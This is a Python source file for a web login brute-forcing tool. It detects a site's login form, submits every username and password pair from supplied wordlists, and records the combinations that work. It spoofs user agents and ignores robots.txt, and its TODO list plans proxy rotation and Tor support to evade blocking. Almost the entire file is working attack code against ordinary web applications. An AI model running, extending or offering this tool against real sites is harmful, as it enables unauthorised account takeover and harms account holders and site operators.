import actions, utils, sys, mechanize

##################################################################
#
#	TODO:
#		+) Multi threading
#		+) Better form detection logic
#		+) Better automatic login condition - gmail, etc..
#
#	TODO FURTHER
#		+) Proxy support
#		+) auto parse proxy list, brute forcing multi Proxy
#		+) sock 5, tor support
#
##################################################################

class BruteForcing(object):
	def __init__(self, optURL, optUsrList, optPassList):
		###############################################################
		#
		#	@Ic3W4ll
		#
		#	varTargetURL: <protocol>://<domain>/<path>
		#	varUserAgent: UserAgents; random choice from file
		#	frmLoginID: ID of login form, for mechanize.Browser().select_form(nr=ID)
		#	frmUsername: Username form's name, get from parse form
		#	frmPassword: Password form's name, get from parse form
		#	lstUsername: Username list, user's option / wordlist
		#	lstPassword: Passowrd list, user's option / wordlist
		#	szPassword:	Password list's size (number of lines/ words)
		#	fndData: Match usernames + passwords
		#
		################################################################

		self.varTargetURL = optURL
		self.varUserAgent = actions.action_getUserAgent()
		self.frmLoginID = 0
		self.frmUserField = ''
		self.frmPassField = ''
		self.lstUsername = optUsrList
		self.lstPassword = optPassList
		self.szPassword = actions.subaction_countListSize(self.lstPassword)
		self.fndData = []
		self.actTestConnection()

	def actTestConnection(self):

		#	Create Browser object
		process = mechanize.Browser()
		process.addheaders = [('User-Agent', self.varUserAgent)]
		process.set_handle_robots(False)

		#	Connecting to Target
		utils.printf("Testing connection....")

		try:
			process.open(self.varTargetURL)
			utils.printf("Connected to URL. Gathering login form information...\n", "good")
			self.frmLoginID, self.frmUserField, self.frmPassField = actions.action_getFormInformation(process.forms())
			utils.printf("Found login form", "good")
			process.close()

		except TypeError:
			utils.printf("Can not find any login form in %s" %(self.varTargetURL), "bad")
			sys.exit(1)

		except mechanize.HTTPError as error:
			utils.printf(error, "bad")
			sys.exit(1)

	def actGetResult(self):
		return self.fndData

	def actTryTargetLogin(self, objBrowser, tryUsername, tryPassword, count):
		try:
			#	Fill Login field Information
			objBrowser.select_form(nr = self.frmLoginID)
			objBrowser.form[self.frmUserField] = tryUsername
			objBrowser.form[self.frmPassField] = tryPassword

			#	Print progress bar
			utils.prints("%10s : %20s%12s%10s / %10s" %(tryUsername, tryPassword, '=' * 6, count, self.szPassword))

			#	Send request
			objBrowser.submit()

			#	Refresh page, useful for redirect after login
			objBrowser.reload()

			#	If result has no login form  -> Success **NEED IMPROVE**
			#		add login information to fndData, return True

			if not actions.action_getFormInformation(objBrowser.forms()):
				utils.printf("Found: %s:%s" %(tryUsername, tryPassword), "good")
				self.fndData.append([tryUsername, tryPassword])
				return True
			return False

		except mechanize.HTTPError as error:
			utils.printf(error, "bad")
			sys.exit(1)

	def run(self):
		#Start brute forcing
		###############################
		#	Testing, does not need
		try:
			self.lstUsername.seek(0)
		except:
			pass

		for idxUsername in self.lstUsername:

			count = 0
			idxUsername = idxUsername.replace('\n', '')

			proc = mechanize.Browser()
			proc.addheaders = [('User-Agent', self.varUserAgent)]
			proc.set_handle_robots(False)
			proc.open(self.varTargetURL)

			#######################################
			#	Read password file from start point
			#
			#######################################
			try:
				self.lstPassword.seek(0)
			except:
				pass

			for idxPasswd in self.lstPassword:
				idxPasswd = idxPasswd.replace('\n', '')

				count += 1
				if self.actTryTargetLogin(proc, idxUsername, idxPasswd, count):
					break

			if count == self.szPassword:
				utils.printf("%s: No match found." %(idxUsername), "bad")
			proc.close()
